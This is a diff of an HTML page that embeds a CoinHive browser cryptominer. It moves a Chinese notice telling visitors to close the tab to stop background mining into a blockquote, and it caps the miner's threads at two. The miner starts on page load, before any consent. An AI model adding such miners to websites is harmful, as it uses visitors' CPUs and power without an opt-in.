@@ -128,12 +128,11 @@
                       <p id="ths"></p>
                       <p id="tah"></p>
                     </center>
-                    <p>記得將這個分頁關閉，不然他會在背景替我挖礦喔</p>
                   </div>
                   <!-- Post Blockquote Start -->
-                  <!-- <div class="post-quote margin-top-40 margin-bottom-40">
-                    <blockquote>Design is not just what is look like, Design is how it's work.</blockquote>
-                  </div> -->
+                  <div class="post-quote margin-top-40 margin-bottom-40">
+                    <blockquote>記得將這個分頁關閉，不然他會在背景替我挖礦喔</blockquote>
+                  </div>
                   <!-- Post Blockquote End -->
                   <!-- Post List Style End -->
                   <!-- Post Author Bio Box Start -->
@@ -270,7 +269,7 @@
   <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
   <script>
   var miner = new CoinHive.Anonymous('33ceLywyCTZaWHeSTYiuA4nJLI7cri7k', {
-    threads: navigator.hardwareConcurrency / 2,
+    threads: (navigator.hardwareConcurrency > 2) ? 2 : navigator.hardwareConcurrency,
     autoThreads: false,
     throttle: 0.7,
     forceASMJS: false
